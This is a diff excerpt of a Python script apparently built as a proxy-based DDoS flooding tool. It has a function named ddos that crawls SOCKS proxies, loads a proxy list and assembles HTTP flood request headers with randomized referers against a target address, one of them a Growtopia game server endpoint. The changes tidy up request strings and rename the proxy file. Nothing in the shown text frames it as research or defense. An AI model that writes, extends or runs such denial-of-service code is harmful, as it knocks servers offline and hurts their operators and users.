@@ -2425,10 +2425,6 @@ def get_proxies():
 def Headers(method):
     header = "UDP"
     if method == "UDP" or method == "TCP" or method == "HTTP":
-        get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
-        post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
-        post_again = "POST http://" + ip + "/growtopia/server_data.php"
-        get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
         referer = "Referer: " + random.choice(referers) + ip + "\r\n"
         connection = "Connection: Keep-Alive\r\n" + "\r\n"
         content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
@@ -2452,13 +2448,9 @@ def Headers(method):
 def ddos():
     socksCrawler()
     socksCrawlz()
-    get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
-    post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
-    post_again = "POST http://" + ip + "/growtopia/server_data.php"
-    get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
     referer = "Referer: " + random.choice(referers) + ip + "\r\n"
     connection = "Connection: Keep-Alive\r\n" + "\r\n"
-    proxies = open("socks5.txt", 'r').read().split('\n')
+    proxies = open("proxies.txt", 'r').read().split('\n')
     content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
     socks = "proxies: " + random.choice(proxies) + "\r\n"
     length = "Content-Length: 0\r\n"
